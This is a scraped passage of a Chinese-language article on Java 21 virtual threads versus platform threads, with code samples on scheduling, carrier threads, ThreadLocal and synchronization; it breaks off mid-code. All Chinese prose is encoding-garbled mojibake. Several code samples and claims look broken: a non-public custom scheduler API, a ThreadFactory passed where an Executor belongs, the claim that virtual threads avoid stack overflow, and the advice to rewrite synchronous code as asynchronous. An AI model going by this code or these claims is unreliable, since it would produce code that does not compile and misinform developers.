d3POFFHifhfV/7k8lwPw7D5mUSEV3r854ju2pK7ffOIWzk/X+Go803Lr+ooGqoiwkyP9xzRXVt0q9sE3CgJYTLqfNPyE/irpkoEe2um6ck4bSiBSeD8JBl41jY/Hgd1lIiaaeoyLlsjgUGAjEH3DB4DtUpEW2Z3Mj5GAgA8efbVvXpX/200nln5IMYvKhHDrvylcwdc9+pSNdeg46WQsP7wo2s7fpWYaPT926fw9ZiVk4BpywYJkGuvlJs4EuWS0p/HTyHh3kbzH2najM85cR0lgpPiYMtukFB26m1u5Ua+vkFkWP3Zn0KCJDg1Px6f42Wtvhrhdyz8ncanrFKCmGH1wrwDMCrh/uxPIUFTAvdHbeVPsc1fVRE+c7Ud/k6fWt7XHFlYqcqQ5wTRvWpiY4wrIZwfDUL+akDRUBXB/jCzFCH9SHCzTDRUmsro7z+cEvrHwxOZn2ZTL/pVFcEBtRLoiWXfxQ5ehvoHHx4vpIwUEuJKSMvPz5/zQq0qwmIy5m+rjBQSwnsCQYnlgwjfT72av6oifOba2qnKcOXeGVIP0rT3BALTNr8mBWSpRHAgmJSTtLGhDHwj+A9GPCbX2DNiBSRoShg0H8zl5y/njxIhJ0WntralDJmIbO+UEvz85Zwt9wj7HIDB5Ttp7RkyGbRDSqC49vOjX50P9aexmr+qInzmajvtO13H02SpyrCVMNj8dT7/4BwByDXzRIC0LWXEldA/njVfip9GpV9VERxQM0lPhrVDyrCVMJr5/fwZJ+qWewR1lSuNJ21sXxnjVgIhck5VhM/cqG1WBpIAMX4Z9Xz+eP58sFUiOBArLQcZpQ0CNCXt1HzA5OfPOFGrrwYHyKTwbNJsxolaJUJbKeo0mu/4uMeXBHBbJSK88qP5jo97fAYva5UIDgivHEXk7mecqKNEhFeOhsjdbxKR+0pb+UsCuK0qIveVtvJn8LJWieAAi9nc/YwTdZQIi9nc/SYR4ZWenSO2yZvgcwTuRYZKWBnUI3e/xF7gcmio5L4HWPlL7AVuyPol95W28me8EnuBa8J+sZjM3c94JfYCd6VxTXjaCjDLe+K9cwTuSuOa8LQUYPXvh1d3w0HC7JK8kMK0/rcJfwHkVMYgi4xhOgAAAABJRU5ErkJggg==");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å¼•è¨€ï¼šçº¿ç¨‹æ¼”è¿›çš„æ–°ç¯‡ç« </h2>
<p>åœ¨Javaå¹¶å‘ç¼–ç¨‹çš„å‘å±•å†ç¨‹ä¸­ï¼Œçº¿ç¨‹å§‹ç»ˆæ˜¯æ ¸å¿ƒæ¦‚å¿µã€‚ä»æ—©æœŸçš„ç»¿è‰²çº¿ç¨‹åˆ°å¦‚ä»Šçš„æ“ä½œç³»ç»Ÿçº¿ç¨‹ï¼ŒJavaä¸€ç›´åœ¨å¯»æ±‚å¹¶å‘æ€§èƒ½ä¸èµ„æºæ•ˆç‡çš„å¹³è¡¡ç‚¹ã€‚Java 21å¼•å…¥çš„è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰æ ‡å¿—ç€å¹¶å‘ç¼–ç¨‹æ¨¡å¼çš„é‡å¤§è½¬å˜ã€‚æœ¬æ–‡å°†æ·±å…¥JVMå±‚é¢ï¼Œè§£æè™šæ‹Ÿçº¿ç¨‹ä¸ä¼ ç»Ÿå¹³å°çº¿ç¨‹çš„æœ¬è´¨åŒºåˆ«ã€å®ç°æœºåˆ¶åŠé€‚ç”¨åœºæ™¯ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€çº¿ç¨‹æ¨¡å‹çš„æ ¹æœ¬å·®å¼‚</h2>
<h3 data-id="heading-2">1.1 å¹³å°çº¿ç¨‹ï¼šæ“ä½œç³»ç»Ÿèµ„æºçš„ç›´æ¥æ˜ å°„</h3>
<p>ä¼ ç»Ÿå¹³å°çº¿ç¨‹ï¼ˆPlatform Threadsï¼‰æœ¬è´¨ä¸Šæ˜¯æ“ä½œç³»ç»Ÿçº¿ç¨‹çš„åŒ…è£…å™¨ï¼Œæ¯ä¸ªJavaå¹³å°çº¿ç¨‹ç›´æ¥å¯¹åº”ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸çº¿ç¨‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ ç»Ÿå¹³å°çº¿ç¨‹åˆ›å»º - æ¯ä¸ªéƒ½æ˜¯æ˜‚è´µçš„OSèµ„æº</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">platformThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"å¹³å°çº¿ç¨‹è¿è¡Œåœ¨OSçº¿ç¨‹: "</span> + Thread.currentThread());
});
platformThread.start();

<span class="hljs-comment">// çº¿ç¨‹æ± ä¸­çš„å¹³å°çº¿ç¨‹</span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);
</code></pre>
<p><strong>JVMå±‚é¢çš„å®ç°ç»†èŠ‚ï¼š</strong></p>
<ul>
<li>æ¯ä¸ªå¹³å°çº¿ç¨‹åœ¨JVMä¸­å¯¹åº”ä¸€ä¸ª<code>java.lang.Thread</code>å®ä¾‹</li>
<li>åœ¨HotSpot JVMä¸­ï¼ŒJavaThreadå¯¹è±¡ä¸OSçº¿ç¨‹ä¸€ä¸€ç»‘å®š</li>
<li>çº¿ç¨‹æ ˆå¤§å°é»˜è®¤1MBï¼ˆ64ä½JVMï¼‰ï¼Œå ç”¨è¿ç»­è™šæ‹Ÿå†…å­˜</li>
<li>ä¸Šä¸‹æ–‡åˆ‡æ¢æ¶‰åŠå®Œæ•´çš„CPUå¯„å­˜å™¨ä¿å­˜/æ¢å¤</li>
</ul>
<h3 data-id="heading-3">1.2 è™šæ‹Ÿçº¿ç¨‹ï¼šç”¨æˆ·æ¨¡å¼çš„è½»é‡çº§æŠ½è±¡</h3>
<p>è™šæ‹Ÿçº¿ç¨‹æ˜¯JVMç®¡ç†çš„è½»é‡çº§çº¿ç¨‹ï¼Œå¤šä¸ªè™šæ‹Ÿçº¿ç¨‹å¯ä»¥å¤ç”¨åŒä¸€ä¸ªå¹³å°çº¿ç¨‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹åˆ›å»º - è½»é‡çº§ä¸”æ•°é‡å¯æ‰©å±•</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">virtualThread</span> <span class="hljs-operator">=</span> Thread.startVirtualThread(() -&gt; {
    System.out.println(<span class="hljs-string">"è™šæ‹Ÿçº¿ç¨‹è¿è¡Œåœ¨è½½ä½“çº¿ç¨‹: "</span> + Thread.currentThread());
});

<span class="hljs-comment">// ä½¿ç”¨è™šæ‹Ÿçº¿ç¨‹çš„ExecutorService</span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">virtualExecutor</span> <span class="hljs-operator">=</span> Executors.newVirtualThreadPerTaskExecutor();
</code></pre>
<p><strong>JVMå±‚é¢çš„é©æ–°ï¼š</strong></p>
<ul>
<li>è™šæ‹Ÿçº¿ç¨‹æ˜¯<code>java.lang.VirtualThread</code>çš„å®ä¾‹</li>
<li>æ ˆå¸§å¯æ ¹æ®éœ€è¦åŠ¨æ€åˆ†é…ï¼ˆæ ˆå—é“¾å¼ç»“æ„ï¼‰</li>
<li>æŒ‚èµ·æ—¶ä¿å­˜å°‘é‡ä¸Šä¸‹æ–‡åˆ°å †å†…å­˜</li>
<li>ç”±ForkJoinPoolä½œä¸ºé»˜è®¤è½½ä½“è°ƒåº¦å™¨</li>
</ul>
<h2 data-id="heading-4">äºŒã€å†…å­˜ç»“æ„ä¸è°ƒåº¦æœºåˆ¶å¯¹æ¯”</h2>
<h3 data-id="heading-5">2.1 æ ˆå†…å­˜ç®¡ç†çš„é©å‘½æ€§å˜åŒ–</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ¼”ç¤ºè™šæ‹Ÿçº¿ç¨‹æ ˆçš„å¼¹æ€§ç‰¹æ€§</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StackDepthDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹æ”¯æŒæ·±åº¦é€’å½’è€Œæ— éœ€æ‹…å¿ƒæ ˆæº¢å‡º</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">vThread</span> <span class="hljs-operator">=</span> Thread.startVirtualThread(() -&gt; {
            recursiveMethod(<span class="hljs-number">10000</span>); <span class="hljs-comment">// æ·±åº¦é€’å½’</span>
        });
        
        <span class="hljs-comment">// å¹³å°çº¿ç¨‹åŒæ ·æ·±åº¦å¯èƒ½å¯¼è‡´StackOverflowError</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">pThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            recursiveMethod(<span class="hljs-number">10000</span>); <span class="hljs-comment">// é£é™©è¾ƒé«˜</span>
        });
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recursiveMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> depth)</span> {
        <span class="hljs-keyword">if</span> (depth == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;
        recursiveMethod(depth - <span class="hljs-number">1</span>);
    }
}
</code></pre>
<p><strong>å†…å­˜ç»“æ„å·®å¼‚ï¼š</strong></p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>å¹³å°çº¿ç¨‹</th><th>è™šæ‹Ÿçº¿ç¨‹</th></tr></thead><tbody><tr><td>æ ˆåˆ†é…</td><td>è¿ç»­è™šæ‹Ÿå†…å­˜é¢„åˆ†é…</td><td>å †å†…å­˜ä¸­çš„æ ˆå—é“¾è¡¨</td></tr><tr><td>æ ˆå¤§å°</td><td>å›ºå®šï¼ˆé»˜è®¤1MBï¼‰</td><td>æŒ‰éœ€å¢é•¿/ç¼©å°</td></tr><tr><td>å†…å­˜å¼€é”€</td><td>~1MB + å…ƒæ•°æ®</td><td>åˆå§‹~200-300å­—èŠ‚</td></tr><tr><td>GCå½±å“</td><td>æ ˆæ ¹ç›´æ¥æ‰«æ</td><td>é€šè¿‡è½½ä½“çº¿ç¨‹é—´æ¥ç®¡ç†</td></tr></tbody></table>
<h3 data-id="heading-6">2.2 è°ƒåº¦å™¨æ¶æ„çš„JVMå®ç°</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªå®šä¹‰è™šæ‹Ÿçº¿ç¨‹è°ƒåº¦å™¨</span>
<span class="hljs-keyword">import</span> java.util.concurrent.*;
<span class="hljs-keyword">import</span> java.util.concurrent.atomic.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomVirtualThreadScheduler</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// JVMå†…éƒ¨è°ƒåº¦å™¨å®ç°æ¦‚è§ˆ</span>
        <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">scheduler</span> <span class="hljs-operator">=</span> Executors.newScheduledThreadPool(<span class="hljs-number">1</span>);
        
        <span class="hljs-type">ThreadFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> Thread.ofVirtual()
            .scheduler(scheduler)  <span class="hljs-comment">// è‡ªå®šä¹‰è°ƒåº¦å™¨</span>
            .factory();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
            <span class="hljs-type">Thread</span> <span class="hljs-variable">vThread</span> <span class="hljs-operator">=</span> factory.newThread(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// æŒ‚èµ·ç‚¹ - è™šæ‹Ÿçº¿ç¨‹å¯èƒ½è¢«å¸è½½</span>
                    System.out.println(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡"</span>);
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            });
            vThread.start();
        }
    }
}
</code></pre>
<p><strong>è°ƒåº¦æœºåˆ¶å¯¹æ¯”è¡¨ï¼š</strong></p>






























<table><thead><tr><th>è°ƒåº¦å±‚é¢</th><th>å¹³å°çº¿ç¨‹è°ƒåº¦</th><th>è™šæ‹Ÿçº¿ç¨‹è°ƒåº¦</th></tr></thead><tbody><tr><td>è°ƒåº¦è€…</td><td>æ“ä½œç³»ç»Ÿå†…æ ¸</td><td>JVMï¼ˆForkJoinPoolï¼‰</td></tr><tr><td>ä¸Šä¸‹æ–‡åˆ‡æ¢</td><td>å†…æ ¸æ¨¡å¼åˆ‡æ¢ï¼ˆ~1-10Î¼sï¼‰</td><td>ç”¨æˆ·æ¨¡å¼åˆ‡æ¢ï¼ˆ~çº³ç§’çº§ï¼‰</td></tr><tr><td>æŠ¢å å¼</td><td>æ˜¯</td><td>åä½œå¼ï¼ˆåœ¨æŒ‚èµ·ç‚¹ï¼‰</td></tr><tr><td>ä¼˜å…ˆçº§</td><td>æ“ä½œç³»ç»Ÿä¼˜å…ˆçº§</td><td>æ— çœŸæ­£ä¼˜å…ˆçº§æ¦‚å¿µ</td></tr></tbody></table>
<h2 data-id="heading-7">ä¸‰ã€JVMå†…éƒ¨å®ç°æ·±åº¦è§£æ</h2>
<h3 data-id="heading-8">3.1 è™šæ‹Ÿçº¿ç¨‹çš„çŠ¶æ€æœºä¸æŒ‚èµ·/æ¢å¤æœºåˆ¶</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹çŠ¶æ€è½¬æ¢æ¼”ç¤º</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualThreadStateDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// ç›‘æ§è™šæ‹Ÿçº¿ç¨‹çŠ¶æ€å˜åŒ–</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">vThread</span> <span class="hljs-operator">=</span> Thread.ofVirtual()
            .unstarted(() -&gt; {
                System.out.println(<span class="hljs-string">"çŠ¶æ€: RUNNING"</span>);
                
                <span class="hljs-comment">// æŒ‚èµ·ç‚¹1: I/Oæ“ä½œ</span>
                <span class="hljs-keyword">try</span> {
                    System.out.println(<span class="hljs-string">"çŠ¶æ€: PARKING (I/O)"</span>);
                    Thread.sleep(<span class="hljs-number">100</span>);  <span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹åœ¨æ­¤æŒ‚èµ·</span>
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
                
                <span class="hljs-comment">// æŒ‚èµ·ç‚¹2: é”è·å–</span>
                <span class="hljs-keyword">synchronized</span> (VirtualThreadStateDemo.class) {
                    System.out.println(<span class="hljs-string">"çŠ¶æ€: RUNNING (ä¸´ç•ŒåŒº)"</span>);
                }
                
                System.out.println(<span class="hljs-string">"çŠ¶æ€: TERMINATING"</span>);
            });
        
        System.out.println(<span class="hljs-string">"åˆå§‹çŠ¶æ€: "</span> + vThread.getState()); <span class="hljs-comment">// NEW</span>
        vThread.start();
        vThread.join();
    }
}
</code></pre>
<p><strong>JVMå†…éƒ¨çŠ¶æ€è½¬æ¢ï¼š</strong></p>
<ol>
<li><strong>NEW â†’ RUNNABLE</strong>: è™šæ‹Ÿçº¿ç¨‹è¢«è°ƒåº¦åˆ°è½½ä½“çº¿ç¨‹</li>
<li><strong>RUNNABLE â†’ PARKING</strong>: é‡åˆ°é˜»å¡æ“ä½œï¼ˆI/Oã€sleepã€é”ï¼‰</li>
<li><strong>PARKING â†’ RUNNABLE</strong>: é˜»å¡æ“ä½œå®Œæˆï¼Œé‡æ–°è°ƒåº¦</li>
<li><strong>RUNNABLE â†’ TERMINATED</strong>: æ‰§è¡Œå®Œæˆ</li>
</ol>
<h3 data-id="heading-9">3.2 è½½ä½“çº¿ç¨‹ï¼ˆCarrier Threadï¼‰çš„å·¥ä½œåŸç†</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è§‚å¯Ÿè½½ä½“çº¿ç¨‹çš„å¤ç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CarrierThreadObservation</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">carrierThreadId</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        List&lt;Thread&gt; virtualThreads = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        Set&lt;String&gt; carrierThreads = ConcurrentHashMap.newKeySet();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            <span class="hljs-type">Thread</span> <span class="hljs-variable">vThread</span> <span class="hljs-operator">=</span> Thread.startVirtualThread(() -&gt; {
                <span class="hljs-comment">// è®°å½•å½“å‰è¿è¡Œçš„è½½ä½“çº¿ç¨‹</span>
                carrierThreads.add(Thread.currentThread().toString());
                
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(<span class="hljs-number">50</span>); <span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹æŒ‚èµ·ï¼Œè½½ä½“çº¿ç¨‹å¯è¢«å…¶ä»–è™šæ‹Ÿçº¿ç¨‹ä½¿ç”¨</span>
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            });
            virtualThreads.add(vThread);
        }
        
        <span class="hljs-keyword">for</span> (Thread t : virtualThreads) {
            t.join();
        }
        
        System.out.println(<span class="hljs-string">"è™šæ‹Ÿçº¿ç¨‹æ•°: "</span> + virtualThreads.size());
        System.out.println(<span class="hljs-string">"ä½¿ç”¨çš„è½½ä½“çº¿ç¨‹æ•°: "</span> + carrierThreads.size());
        <span class="hljs-comment">// é€šå¸¸: è½½ä½“çº¿ç¨‹æ•° &lt;&lt; è™šæ‹Ÿçº¿ç¨‹æ•°</span>
    }
}
</code></pre>
<h2 data-id="heading-10">å››ã€æ€§èƒ½ç‰¹å¾ä¸é€‚ç”¨åœºæ™¯</h2>
<h3 data-id="heading-11">4.1 å¹¶å‘è§„æ¨¡ä¸ååé‡å¯¹æ¯”</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é«˜å¹¶å‘åœºæ™¯æ€§èƒ½æµ‹è¯•</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcurrencyBenchmark</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">TASK_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">100_000</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¹³å°çº¿ç¨‹æ± æµ‹è¯•</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">platformTime</span> <span class="hljs-operator">=</span> testWithExecutor(
            Executors.newFixedThreadPool(<span class="hljs-number">1000</span>));
        
        <span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹æµ‹è¯•</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">virtualTime</span> <span class="hljs-operator">=</span> testWithExecutor(
            Executors.newVirtualThreadPerTaskExecutor());
        
        System.out.printf(<span class="hljs-string">"å¹³å°çº¿ç¨‹æ± æ—¶é—´: %dms%n"</span>, platformTime);
        System.out.printf(<span class="hljs-string">"è™šæ‹Ÿçº¿ç¨‹æ—¶é—´: %dms%n"</span>, virtualTime);
        System.out.printf(<span class="hljs-string">"æ€§èƒ½æå‡: %.2fx%n"</span>, 
            (<span class="hljs-type">double</span>)platformTime / virtualTime);
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">testWithExecutor</span><span class="hljs-params">(ExecutorService executor)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(TASK_COUNT);
        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; TASK_COUNT; i++) {
            executor.submit(() -&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// æ¨¡æ‹ŸI/Oå¯†é›†å‹æ“ä½œ</span>
                    Thread.sleep(<span class="hljs-number">10</span>);
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    Thread.currentThread().interrupt();
                } <span class="hljs-keyword">finally</span> {
                    latch.countDown();
                }
            });
        }
        
        latch.await();
        executor.shutdown();
        <span class="hljs-keyword">return</span> System.currentTimeMillis() - start;
    }
}
</code></pre>
<h3 data-id="heading-12">4.2 é€‚ç”¨åœºæ™¯æŒ‡å—</h3>



































<table><thead><tr><th>åœºæ™¯ç±»å‹</th><th>æ¨èä½¿ç”¨</th><th>åŸå› åˆ†æ</th></tr></thead><tbody><tr><td>I/Oå¯†é›†å‹</td><td>è™šæ‹Ÿçº¿ç¨‹</td><td>é«˜å¹¶å‘ã€é¢‘ç¹é˜»å¡ï¼Œè™šæ‹Ÿçº¿ç¨‹æŒ‚èµ·æˆæœ¬ä½</td></tr><tr><td>CPUå¯†é›†å‹</td><td>å¹³å°çº¿ç¨‹</td><td>æŒç»­è®¡ç®—ï¼Œè™šæ‹Ÿçº¿ç¨‹åˆ‡æ¢æ— ä¼˜åŠ¿</td></tr><tr><td>ä½å»¶è¿Ÿç³»ç»Ÿ</td><td>å¹³å°çº¿ç¨‹</td><td>è™šæ‹Ÿçº¿ç¨‹è°ƒåº¦å¯èƒ½å¼•å…¥ä¸ç¡®å®šæ€§</td></tr><tr><td>æ‰¹é‡ä»»åŠ¡å¤„ç†</td><td>è™šæ‹Ÿçº¿ç¨‹</td><td>å¯åˆ›å»ºå¤§é‡å¹¶è¡Œä»»åŠ¡ï¼Œå†…å­˜æ•ˆç‡é«˜</td></tr><tr><td>ç°æœ‰çº¿ç¨‹æ± </td><td>è¯„ä¼°è¿ç§»</td><td>éœ€é‡å†™åŒæ­¥ä»£ç ä¸ºå¼‚æ­¥æ¨¡å¼</td></tr></tbody></table>
<h2 data-id="heading-13">äº”ã€æœ€ä½³å®è·µä¸è¿ç§»ç­–ç•¥</h2>
<h3 data-id="heading-14">5.1 çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆThreadLocalï¼‰çš„æŒ‘æˆ˜</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è™šæ‹Ÿçº¿ç¨‹ä¸­çš„ThreadLocalä½¿ç”¨</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VirtualThreadLocalDemo</span> {
    <span class="hljs-comment">// æ³¨æ„ï¼šè™šæ‹Ÿçº¿ç¨‹ä¸­å¤§é‡ä½¿ç”¨ThreadLocalå¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;<span class="hljs-type">byte</span>[]&gt; THREAD_LOCAL_DATA = 
        ThreadLocal.withInitial(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åœ¨è™šæ‹Ÿçº¿ç¨‹ä¸­ä½¿ç”¨ThreadLocaléœ€è°¨æ…</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10_000</span>; i++) {
            Thread.startVirtualThread(() -&gt; {
                <span class="hljs-comment">// æ¯ä¸ªè™šæ‹Ÿçº¿ç¨‹éƒ½æœ‰ç‹¬ç«‹çš„ThreadLocalå‰¯æœ¬</span>
                <span class="hljs-type">byte</span>[] data = THREAD_LOCAL_DATA.get();
                
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// ä½¿ç”¨æ•°æ®...</span>
                    Thread.sleep(<span class="hljs-number">10</span>);
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    Thread.currentThread().interrupt();
                } <span class="hljs-keyword">finally</span> {
                    <span class="hljs-comment">// å¿…é¡»æ¸…ç†ï¼å¦åˆ™æ•°æ®ä¼šä¿ç•™åˆ°è™šæ‹Ÿçº¿ç¨‹ç»ˆæ­¢</span>
                    THREAD_LOCAL_DATA.remove();
                }
            });
        }
        
        <span class="hljs-comment">// æ›¿ä»£æ–¹æ¡ˆï¼šä½¿ç”¨Scoped Valuesï¼ˆJava 20+é¢„è§ˆç‰¹æ€§ï¼‰</span>
        <span class="hljs-comment">// ScopedValueæ›´é€‚åˆè™šæ‹Ÿçº¿ç¨‹æ¨¡å‹</span>
    }
}
</code></pre>
<h3 data-id="heading-15">5.2 åŒæ­¥ä»£ç çš„ä¼˜åŒ–ç­–ç•¥</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å°†åŒæ­¥é˜»å¡ä»£ç é‡æ„ä¸ºéé˜»å¡æ¨¡å¼</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizationOptimization</span> {
    <span class="hljs-comment">// ä¼ ç»ŸåŒæ­¥æ–¹æ³• - åœ¨è™šæ‹Ÿçº¿ç¨‹ä¸­å¯èƒ½é˜»å¡è½½ä½“çº¿ç¨‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">traditionalSyncMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// é•¿æ—¶é—´æ“ä½œä¼šé˜»å¡è½½ä½“çº¿ç¨‹</span>
        performIOOperation();
    }
    
    <span class="hljs-comment">// ä¼˜åŒ–ä¸ºè™šæ‹Ÿçº¿ç¨‹å‹å¥½çš„å¼‚æ­¥æ¨¡å¼</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;Void&gt; <span class="hljs-title function_">asyncMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.runAsync(() -&gt; {
            performIOOperation();
        }, Thread.ofVirtual().factory());
    }
    
    <span class="hljs-comment">// ä½¿ç”¨ReentrantLockæ›¿ä»£synchronized</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
